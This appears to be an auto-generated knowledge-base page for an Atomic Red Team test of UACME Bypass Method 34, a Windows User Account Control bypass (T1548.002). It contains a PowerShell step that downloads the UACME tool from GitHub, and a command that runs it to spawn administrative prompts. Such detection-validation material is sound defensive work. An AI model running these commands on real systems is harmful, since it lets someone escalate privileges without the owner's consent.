---
atomic_guid: "695b2dac-423e-448e-b6ef-5b88e93011d6"
title: "UACME Bypass Method 34"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "695b2dac-423e-448e-b6ef-5b88e93011d6"
  - "UACME Bypass Method 34"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# UACME Bypass Method 34

Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.

Author: James Forshaw

Type:	Shell API

Method: Environment variables expansion

Target:	\system32\svchost.exe via \system32\schtasks.exe

Component:	Attacker defined

Implementation:	ucmDiskCleanupEnvironmentVariable

UCM Method:	UacMethodDiskSilentCleanup

https://github.com/hfiref0x/UACME

## Metadata

- Atomic GUID: 695b2dac-423e-448e-b6ef-5b88e93011d6
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: command_prompt
- Dependency Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### uacme_exe

- description: Path to uacme executable
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\uacme\34 Akagi64.exe

## Dependencies

UACME executable must exist on disk at specified location ("#{uacme_exe}")

### Prerequisite Check

```text
$tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder\..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\uacme.zip" -Force
```

## Executor

- name: command_prompt

### Command

```commandprompt
"#{uacme_exe}"
```

### Cleanup

```commandprompt
powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
